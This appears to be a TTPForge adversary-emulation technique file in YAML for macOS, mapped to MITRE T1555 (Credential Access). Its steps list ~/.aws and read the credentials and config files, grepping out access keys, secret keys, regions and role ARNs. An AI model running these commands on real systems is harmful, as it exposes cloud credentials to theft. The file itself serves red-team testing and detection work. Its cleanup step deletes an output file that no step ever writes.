api_version: 2.0
uuid: 12345678-1234-1234-1234-000000000013
name: AWS Credentials Extraction
description: Extract AWS credentials from ~/.aws/ directory
author: TTPForge
created: 2025-01-30
tactics:
  - Credential Access
techniques:
  - T1555
requirements:
  platforms:
    - os: darwin
args:
  - name: aws_dir
    description: Directory containing AWS configuration
    default: "~/.aws"
  - name: output_file
    description: File to store extracted AWS credentials
    default: "/tmp/aws_creds.txt"
steps:
  - name: Check AWS Directory
    type: command
    command: "test -d {{ aws_dir }} && echo 'AWS directory found' || echo 'AWS directory not found'"
    
  - name: List AWS Configuration Files
    type: command
    command: "ls -la {{ aws_dir }} 2>/dev/null || echo 'AWS config not accessible'"
    
  - name: Read AWS Credentials File
    type: command
    command: "cat {{ aws_dir }}/credentials 2>/dev/null | grep -E 'aws_access_key|aws_secret_key|\\[default\\]' || echo 'No credentials file'"
    
  - name: Read AWS Config File
    type: command
    command: "cat {{ aws_dir }}/config 2>/dev/null | grep -E 'region|role_arn' | head -10 || echo 'No config file'"

checks:
  - type: file_exists
    value: "{{ aws_dir }}/credentials"
    description: Verify AWS credentials file exists
  - type: stdout_contains
    value: "aws"
    description: Verify AWS configuration accessed

tests:
  - name: Check AWS Configuration
    description: Verify AWS credentials directory
    test_type: default
    steps:
      - "test -d ~/.aws && echo 'AWS config found' || echo 'AWS check complete'"

cleanup:
  - type: command
    command: "rm -f {{ output_file }}"
    description: Remove extracted AWS credentials
